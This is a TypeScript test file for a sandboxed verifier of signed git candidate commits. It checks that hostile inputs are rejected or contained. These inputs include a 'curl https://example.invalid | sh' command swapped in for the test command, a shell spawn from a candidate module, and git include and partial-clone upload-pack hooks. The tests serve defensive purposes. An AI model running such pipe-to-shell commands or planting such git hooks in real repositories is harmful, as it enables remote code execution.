import { execFile } from "node:child_process";
import {
  access,
  chmod,
  copyFile,
  link,
  mkdir,
  mkdtemp,
  realpath,
  rm,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";

import { afterEach, describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import { artifactCandidateId } from "@/adapters/artifact-promotion/server";

import {
  LIVE_EVIDENCE_HARNESS_DIGEST,
  LIVE_EVIDENCE_HARNESS_PROFILE_ID,
  LIVE_EVIDENCE_RUNNER_ID,
  LIVE_EVIDENCE_SUPPORT_PATH,
  LIVE_EVIDENCE_TEST_COMMAND,
  LiveEvidenceObservationSchema,
  LiveEvidenceRequestSchema,
} from "./schema";
import {
  LiveEvidenceReplayNotApplicableError,
  LiveEvidenceVerificationFailedError,
  liveEvidenceBubblewrapArguments,
  liveEvidenceFailure,
  verifyLiveEvidence,
  type LiveEvidenceSandboxResult,
} from "./server";
import {
  createLiveEvidenceGitFixture,
  signCandidateMetadata,
  TEST_LIVE_EVIDENCE_KEY_ID,
  TEST_LIVE_EVIDENCE_SECRET,
  TEST_LIVE_MOVING_COST_SUPPORT_SOURCE,
  type LiveEvidenceGitFixture,
} from "./test-fixture";
import { testLiveEvidenceHarnessObservation } from "./test-observation";

const execFileAsync = promisify(execFile);
const EMPTY_SHA256 =
  "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";

const fixtures: LiveEvidenceGitFixture[] = [];
const temporaryDirectories: string[] = [];

afterEach(async () => {
  await Promise.all([
    ...fixtures.splice(0).map((fixture) => fixture.cleanup()),
    ...temporaryDirectories
      .splice(0)
      .map((path) => rm(path, { recursive: true, force: true })),
  ]);
});

async function fixture(
  input: Parameters<typeof createLiveEvidenceGitFixture>[0] = {},
): Promise<LiveEvidenceGitFixture> {
  const created = await createLiveEvidenceGitFixture(input);
  fixtures.push(created);
  return created;
}

function options(
  created: LiveEvidenceGitFixture,
  overrides: Partial<Parameters<typeof verifyLiveEvidence>[1]> = {},
): Parameters<typeof verifyLiveEvidence>[1] {
  return {
    signingSecrets: {
      [TEST_LIVE_EVIDENCE_KEY_ID]: TEST_LIVE_EVIDENCE_SECRET,
    },
    repositories: {
      [created.receipt.metadata.repositoryId]: {
        repositoryPath: created.repositoryPath,
      },
    },
    now: () => new Date("2026-07-18T12:05:00.000Z"),
    commandTimeoutMs: 20_000,
    ...overrides,
  };
}

function commandObservation(exitCode: number): LiveEvidenceSandboxResult {
  const testHarness = testLiveEvidenceHarnessObservation("f".repeat(40));
  const observation: LiveEvidenceSandboxResult["observation"] = {
    declaredCommand: LIVE_EVIDENCE_TEST_COMMAND,
    executionKind: "sandboxed_candidate",
    runnerId: LIVE_EVIDENCE_RUNNER_ID,
    exitCode,
    termination: "exited",
    stdout: {
      observedDigest: EMPTY_SHA256,
      observedByteLength: 0,
      excerpt: "",
      excerptByteLength: 0,
      truncated: false,
    },
    stderr: {
      observedDigest: EMPTY_SHA256,
      observedByteLength: 0,
      excerpt: "",
      excerptByteLength: 0,
      truncated: false,
    },
    harness: {
      ...testHarness,
      reportVerified: exitCode === 0,
      cases: exitCode === 0 ? testHarness.cases : [],
    },
  };
  return { observation, passed: exitCode === 0 };
}

async function symlinkedNodeToolchain(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "odeu-live-evidence-toolchain-"));
  temporaryDirectories.push(root);
  const bin = join(root, "bin");
  await mkdir(bin, { mode: 0o700 });
  const source = await realpath(process.execPath);
  const destination = join(bin, "node-real");
  try {
    await link(source, destination);
  } catch (error) {
    if (
      !new Set(["EXDEV", "EPERM", "EACCES", "EMLINK"]).has(
        (error as NodeJS.ErrnoException).code ?? "",
      )
    ) {
      throw error;
    }
    await copyFile(source, destination);
    await chmod(destination, 0o500);
  }
  await symlink("node-real", join(bin, "node"));
  return root;
}

describe("independent live-candidate evidence verifier", { timeout: 15_000 }, () => {
  it("validates the sealed commit and runs the exact registered command in bubblewrap", async () => {
    const created = await fixture();
    const result = await verifyLiveEvidence(created.request, options(created));

    expect(result).toMatchObject({
      ok: true,
      status: "passed",
      bindings: {
        closureId: "closure-live-evidence-test",
        runId: "run-live-evidence-test",
        briefId: "brief-live-evidence-test",
        artifactCandidateCommit: created.candidateCommit,
      },
      candidate: {
        candidateId: created.receipt.metadata.candidateId,
        baseCommit: created.baseCommit,
        candidateCommit: created.candidateCommit,
        receiptKeyId: TEST_LIVE_EVIDENCE_KEY_ID,
      },
      observedAt: "2026-07-18T12:05:00.000Z",
    });
    expect(result.observations).toHaveLength(
      created.request.evidenceRequirements.length,
    );
    const test = result.observations.find(
      (observation) =>
        observation.requirementId === "requirement-focused-tests",
    );
    expect(test).toMatchObject({
      result: "passed",
      execution: {
        declaredCommand: "npm test -- moving-cost",
        executionKind: "sandboxed_candidate",
        runnerId: LIVE_EVIDENCE_RUNNER_ID,
        exitCode: 0,
        termination: "exited",
        stdout: {
          observedDigest: expect.stringMatching(/^sha256:[0-9a-f]{64}$/),
          observedByteLength: expect.any(Number),
          excerptByteLength: expect.any(Number),
          truncated: false,
        },
        harness: {
          profileId: LIVE_EVIDENCE_HARNESS_PROFILE_ID,
          digest: LIVE_EVIDENCE_HARNESS_DIGEST,
          reportVerified: true,
          support: {
            path: LIVE_EVIDENCE_SUPPORT_PATH,
            blob: created.receipt.metadata.manifest.entries.find(
              (entry) => entry.path === LIVE_EVIDENCE_SUPPORT_PATH,
            )?.newBlob,
            byteLength: Buffer.byteLength(
              TEST_LIVE_MOVING_COST_SUPPORT_SOURCE,
              "utf8",
            ),
          },
          cases: [
            { caseId: "two-ordinary-quotes", result: "passed" },
            { caseId: "decimal-components", result: "passed" },
            { caseId: "zero-fees", result: "passed" },
          ],
          isolation: {
            processLimitInUserNamespace: 16,
            aggregateCgroupIsolation: false,
          },
        },
      },
    });
    expect(test?.execution?.stdout.excerpt).toContain(
      "moving-cost immutable host harness verified 3 fixed vectors",
    );
  }, 30_000);

  it("canonicalizes and executes an in-toolchain Node symlink", async () => {
    const created = await fixture();
    const toolchainPath = await symlinkedNodeToolchain();

    const result = await verifyLiveEvidence(
      created.request,
      options(created, {
        repositories: {
          [created.receipt.metadata.repositoryId]: {
            repositoryPath: created.repositoryPath,
            toolchainPath,
          },
        },
      }),
    );

    expect(result.status).toBe("passed");
  }, 30_000);

  it("rejects a toolchain Node symlink that escapes its registered root", async () => {
    const created = await fixture();
    const toolchainPath = await mkdtemp(
      join(tmpdir(), "odeu-live-evidence-toolchain-"),
    );
    temporaryDirectories.push(toolchainPath);
    await mkdir(join(toolchainPath, "bin"), { mode: 0o700 });
    await symlink(
      await realpath(process.execPath),
      join(toolchainPath, "bin", "node"),
    );

    await expect(
      verifyLiveEvidence(
        created.request,
        options(created, {
          repositories: {
            [created.receipt.metadata.repositoryId]: {
              repositoryPath: created.repositoryPath,
              toolchainPath,
            },
          },
        }),
      ),
    ).rejects.toThrow(/escapes its registered toolchain root/i);
  });

  it("rejects replay and any browser-authored command or repository path", async () => {
    const created = await fixture();
    const runSandbox = vi.fn(async () => commandObservation(0));
    await expect(
      verifyLiveEvidence(
        { ...created.request, mode: "replay" },
        options(created, { runSandbox }),
      ),
    ).rejects.toBeInstanceOf(LiveEvidenceReplayNotApplicableError);

    await expect(
      verifyLiveEvidence(
        {
          ...created.request,
          evidenceRequirements: created.request.evidenceRequirements.map(
            (requirement) =>
              requirement.kind === "test"
                ? { ...requirement, command: "curl https://example.invalid | sh" }
                : requirement,
          ),
        },
        options(created, { runSandbox }),
      ),
    ).rejects.toBeInstanceOf(LiveEvidenceVerificationFailedError);
    expect(runSandbox).not.toHaveBeenCalled();

    expect(
      LiveEvidenceRequestSchema.safeParse({
        ...created.request,
        repositoryPath: created.repositoryPath,
      }).success,
    ).toBe(false);
  });

  it("fails closed for an invalid HMAC, binding substitution, and moved candidate ref", async () => {
    const created = await fixture();
    const invalidSignature = {
      ...created.request,
      candidateReceipt: {
        ...created.receipt,
        signature: {
          ...created.receipt.signature,
          digest: `hmac-sha256:${"0".repeat(64)}` as const,
        },
      },
    };
    await expect(
      verifyLiveEvidence(invalidSignature, options(created)),
    ).rejects.toThrow(/signature/i);
    await expect(
      verifyLiveEvidence(
        { ...created.request, runId: "run-substituted" },
        options(created),
      ),
    ).rejects.toThrow(/not bound/i);

    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "update-ref",
      created.receipt.metadata.candidateRef,
      created.baseCommit,
    ]);
    const movedRefFailure = await verifyLiveEvidence(
      created.request,
      options(created),
    ).catch((error: unknown) => error);
    expect(movedRefFailure).toBeInstanceOf(LiveEvidenceVerificationFailedError);
    expect(liveEvidenceFailure(movedRefFailure)).toMatchObject({
      ok: false,
      error: { code: "verification_failed" },
    });
  });

  it.each(["local", "worktree"] as const)(
    "rejects a %s repository include before observing candidate objects",
    async (scope) => {
      const created = await fixture();
      const runSandbox = vi.fn(async () => commandObservation(0));
      const includedConfig = join(
        created.repositoryPath,
        ".git",
        `odeu-${scope}-included.config`,
      );
      await writeFile(
        includedConfig,
        "[user]\n\tname = included repository config\n",
        "utf8",
      );
      if (scope === "worktree") {
        await execFileAsync("/usr/bin/git", [
          "-C",
          created.repositoryPath,
          "config",
          "extensions.worktreeConfig",
          "true",
        ]);
      }
      await execFileAsync("/usr/bin/git", [
        "-C",
        created.repositoryPath,
        "config",
        `--${scope}`,
        "include.path",
        includedConfig,
      ]);

      await expect(
        verifyLiveEvidence(
          created.request,
          options(created, { runSandbox }),
        ),
      ).rejects.toThrow(/unsafe includes or partial-clone helpers/i);
      expect(runSandbox).not.toHaveBeenCalled();
    },
  );

  it("rejects repository-controlled partial-clone upload-pack before it can execute", async () => {
    const created = await fixture();
    const runSandbox = vi.fn(async () => commandObservation(0));
    const marker = join(created.repositoryPath, "upload-pack-invoked");
    const uploadPack = join(
      created.repositoryPath,
      ".git",
      "untrusted-upload-pack.sh",
    );
    await writeFile(
      uploadPack,
      [
        "#!/bin/sh",
        `printf 'invoked\\n' > ${JSON.stringify(marker)}`,
        "exit 1",
        "",
      ].join("\n"),
      { mode: 0o700 },
    );
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "remote.untrusted.promisor",
      "true",
    ]);
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "remote.untrusted.partialCloneFilter",
      "blob:none",
    ]);
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "remote.untrusted.uploadPack",
      uploadPack,
    ]);
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "remote.untrusted.url",
      created.repositoryPath,
    ]);
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "core.repositoryFormatVersion",
      "1",
    ]);
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "config",
      "extensions.partialClone",
      "untrusted",
    ]);

    await expect(
      verifyLiveEvidence(
        created.request,
        options(created, { runSandbox }),
      ),
    ).rejects.toThrow(/unsafe includes or partial-clone helpers/i);
    expect(runSandbox).not.toHaveBeenCalled();
    await expect(access(marker)).rejects.toMatchObject({ code: "ENOENT" });
  });

  it("rejects an annotated-tag candidate ref even when it peels to the signed commit", async () => {
    const created = await fixture();
    const runSandbox = vi.fn(async () => commandObservation(0));
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "tag",
      "-a",
      "candidate-ref-indirection",
      "-m",
      "candidate ref indirection",
      created.candidateCommit,
    ]);
    const { stdout: tagObjectOutput } = await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "rev-parse",
      "refs/tags/candidate-ref-indirection",
    ]);
    const tagObject = tagObjectOutput.trim();
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "update-ref",
      "--no-deref",
      created.receipt.metadata.candidateRef,
      tagObject,
      created.candidateCommit,
    ]);
    const { stdout: peeledOutput } = await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "rev-parse",
      `${created.receipt.metadata.candidateRef}^{commit}`,
    ]);
    expect(peeledOutput.trim()).toBe(created.candidateCommit);

    await expect(
      verifyLiveEvidence(
        created.request,
        options(created, { runSandbox }),
      ),
    ).rejects.toThrow(/directly to a commit object without tag peeling/i);
    expect(runSandbox).not.toHaveBeenCalled();
  });

  it("rejects a symbolic candidate ref even when it resolves to the signed commit", async () => {
    const created = await fixture();
    const runSandbox = vi.fn(async () => commandObservation(0));
    await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "symbolic-ref",
      created.receipt.metadata.candidateRef,
      "refs/heads/candidate",
    ]);
    const { stdout: peeledOutput } = await execFileAsync("/usr/bin/git", [
      "-C",
      created.repositoryPath,
      "rev-parse",
      `${created.receipt.metadata.candidateRef}^{commit}`,
    ]);
    expect(peeledOutput.trim()).toBe(created.candidateCommit);

    await expect(
      verifyLiveEvidence(
        created.request,
        options(created, { runSandbox }),
      ),
    ).rejects.toThrow(/direct Git ref, not a symbolic ref/i);
    expect(runSandbox).not.toHaveBeenCalled();
  });

  it(
    "requires the declared artifact in the signed manifest and the exact parent/base",
    async () => {
      const noDeclaredChange = await fixture({ changeDeclaredArtifact: false });
      await expect(
        verifyLiveEvidence(
          noDeclaredChange.request,
          options(noDeclaredChange, {
            runSandbox: async () => commandObservation(0),
          }),
        ),
      ).rejects.toThrow(/signed manifest contains no declared/i);

      const created = await fixture();
      const originalMaterial = { ...created.receipt.metadata };
      Reflect.deleteProperty(originalMaterial, "candidateId");
      Reflect.deleteProperty(originalMaterial, "candidateRef");
      const material = {
        ...originalMaterial,
        git: {
          ...created.receipt.metadata.git,
          baseCommit: created.candidateCommit,
          baseTree: created.receipt.metadata.git.candidateTree,
        },
      };
      const candidateId = artifactCandidateId(material);
      const candidateRef = `refs/odeu/candidates/${candidateId.slice("artifact-candidate:sha256:".length)}`;
      await execFileAsync("/usr/bin/git", [
        "-C",
        created.repositoryPath,
        "update-ref",
        candidateRef,
        created.candidateCommit,
      ]);
      const metadata = { ...material, candidateId, candidateRef };
      const receipt = signCandidateMetadata(metadata);
      const parentFailure = await verifyLiveEvidence(
        {
          ...created.request,
          artifactBaseRef: `git:${created.candidateCommit}`,
          artifactCandidateId: candidateId,
          candidateReceipt: receipt,
        },
        options(created, { runSandbox: async () => commandObservation(0) }),
      ).catch((error: unknown) => error);
      expect(parentFailure).toBeInstanceOf(
        LiveEvidenceVerificationFailedError,
      );
      expect(
        (parentFailure as LiveEvidenceVerificationFailedError).issues,
      ).toContain(
        "Candidate commit must have exactly the signed base commit as its parent.",
      );
    },
    15_000,
  );

  it("returns one bounded observation per requirement when the registered command fails", async () => {
    const created = await fixture();
    const result = await verifyLiveEvidence(
      created.request,
      options(created, { runSandbox: async () => commandObservation(1) }),
    );

    expect(result.status).toBe("failed");
    expect(result.observations).toHaveLength(2);
    expect(
      result.observations.find(
        (observation) => observation.requirementId === "requirement-focused-tests",
      ),
    ).toMatchObject({ result: "failed", execution: { exitCode: 1 } });
    expect(
      result.observations.find(
        (observation) => observation.requirementId === "requirement-artifact-change",
      ),
    ).toMatchObject({ result: "passed", artifact: { path: "demo/moving-costs.html" } });
  });

  it("ignores candidate-owned package scripts and verifies only the registered blobs", async () => {
    const created = await fixture({
      candidatePackageTestScript:
        "node -e \"console.error('candidate-owned-script-ran'); process.exit(99)\"",
    });

    const result = await verifyLiveEvidence(created.request, options(created));
    const execution = result.observations.find(
      (observation) => observation.execution !== null,
    )?.execution;

    expect(result.status).toBe("passed");
    expect(
      created.receipt.metadata.manifest.entries.some(
        (entry) => entry.path === "package.json",
      ),
    ).toBe(true);
    expect(execution?.stdout.excerpt).not.toContain("candidate-owned-script-ran");
    expect(execution?.stderr.excerpt).not.toContain("candidate-owned-script-ran");
    expect(execution?.harness.reportVerified).toBe(true);
  }, 30_000);

  it("blocks candidate process imports before a fork can escape the harness", async () => {
    const created = await fixture({
      supportModuleSource: [
        'const childProcess = await import("node:child_process");',
        'childProcess.spawn("/bin/sh", ["-c", "echo escaped"]);',
        "export function calculateMovingTotalCents() { return 110000; }",
        "",
      ].join("\n"),
    });

    const result = await verifyLiveEvidence(created.request, options(created));
    const execution = result.observations.find(
      (observation) => observation.execution !== null,
    )?.execution;

    expect(result.status).toBe("failed");
    expect(execution).toMatchObject({
      exitCode: 1,
      termination: "exited",
      harness: { reportVerified: false, cases: [] },
    });
    expect(execution?.stderr.excerpt).toContain(
      "Candidate dynamic imports are not permitted",
    );
    expect(execution?.stderr.excerpt).not.toContain("escaped");
  }, 30_000);

  it("bounds candidate-authored error output before it reaches durable evidence", async () => {
    const created = await fixture({
      supportModuleSource: [
        'throw new Error("candidate-output-" + "x".repeat(2_000_000));',
        "export function calculateMovingTotalCents() { return 110000; }",
        "",
      ].join("\n"),
    });

    const result = await verifyLiveEvidence(created.request, options(created));
    const execution = result.observations.find(
      (observation) => observation.execution !== null,
    )?.execution;

    expect(result.status).toBe("failed");
    expect(execution?.stderr.excerpt).toContain("candidate-output-");
    expect(execution?.stderr.observedByteLength).toBeLessThan(2_048);
    expect(execution?.stderr.truncated).toBe(false);
    expect(execution?.harness.reportVerified).toBe(false);
  }, 30_000);

  it("interrupts non-terminating candidate calculation inside the fixed VM budget", async () => {
    const created = await fixture({
      supportModuleSource: [
        "export function calculateMovingTotalCents() {",
        "  while (true) {}",
        "}",
        "",
      ].join("\n"),
    });
    const startedAt = Date.now();

    const result = await verifyLiveEvidence(created.request, options(created));
    const execution = result.observations.find(
      (observation) => observation.execution !== null,
    )?.execution;

    expect(Date.now() - startedAt).toBeLessThan(10_000);
    expect(result.status).toBe("failed");
    expect(execution).toMatchObject({
      exitCode: 1,
      termination: "exited",
      harness: { reportVerified: false, cases: [] },
    });
    expect(execution?.stderr.excerpt).toMatch(/timed out/i);
  }, 30_000);

  it("does not treat exit zero as passing without the exact harness report", async () => {
    const unverified = commandObservation(1);
    const created = await fixture();
    const result = await verifyLiveEvidence(
      created.request,
      options(created, {
        runSandbox: async () => ({
          passed: false,
          observation: {
            ...unverified.observation,
            exitCode: 0,
          },
        }),
      }),
    );

    expect(result.status).toBe("failed");
    expect(
      result.observations.find((observation) => observation.execution !== null),
    ).toMatchObject({
      result: "failed",
      execution: {
        exitCode: 0,
        termination: "exited",
        harness: { reportVerified: false, cases: [] },
      },
    });
  });

  it("rejects forged passing observations with an unverified or duplicate harness report", () => {
    const execution = commandObservation(0).observation;
    const observation = {
      requirementId: "requirement-focused-tests",
      result: "passed" as const,
      evidenceRef: "live-candidate://schema/check",
      detail: "The immutable host harness passed.",
      artifact: null,
      execution,
    };

    expect(LiveEvidenceObservationSchema.safeParse(observation).success).toBe(
      true,
    );
    expect(
      LiveEvidenceObservationSchema.safeParse({
        ...observation,
        execution: {
          ...execution,
          harness: {
            ...execution.harness,
            reportVerified: false,
            cases: [],
          },
        },
      }).success,
    ).toBe(false);
    expect(
      LiveEvidenceObservationSchema.safeParse({
        ...observation,
        execution: {
          ...execution,
          harness: {
            ...execution.harness,
            cases: [
              execution.harness.cases[0],
              execution.harness.cases[0],
              execution.harness.cases[2],
            ],
          },
        },
      }).success,
    ).toBe(false);
  });

  it("constructs a read-only host-harness sandbox with explicit process and storage limits", () => {
    const args = liveEvidenceBubblewrapArguments({
      checkoutPath: "/trusted/server/candidate",
      nodeCommandPath: "/toolchain/bin/node-real",
      processLimitCommandPath: "/usr/bin/prlimit-real",
      reportNonce: "a".repeat(64),
      toolchainPath: "/trusted/server/toolchain",
    });

    expect(args).toEqual(
      expect.arrayContaining([
        "--die-with-parent",
        "--new-session",
        "--unshare-all",
        "--unshare-user",
        "--unshare-net",
        "--disable-userns",
        "--assert-userns-disabled",
        "--clearenv",
        "--ro-bind",
        "/trusted/server/candidate",
        "/trusted/server/toolchain",
        "/candidate",
        "--ro-bind-data",
        "/usr/bin/prlimit-real",
        "--core=0:0",
        "--memlock=0:0",
        "--msgqueue=0:0",
        "--cpu=4:5",
        "--nproc=16:16",
        "--as=2147483648:2147483648",
        "--fsize=1048576:1048576",
        "--nofile=64:64",
        "--stack=8388608:8388608",
        "/toolchain/bin/node-real",
        "--experimental-vm-modules",
      ]),
    );
    expect(args.slice(-2)).toEqual([
      "a".repeat(64),
      expect.stringMatching(/^sha256:[0-9a-f]{64}$/),
    ]);
    expect(args.join(" ")).not.toContain("curl");
    expect(args.join(" ")).not.toContain("npm");
    expect(args.join(" ")).not.toContain("package.json");
    expect(args.join(" ")).not.toContain("node_modules");
    expect(args.join(" ")).not.toContain("/workspace");
  });
});
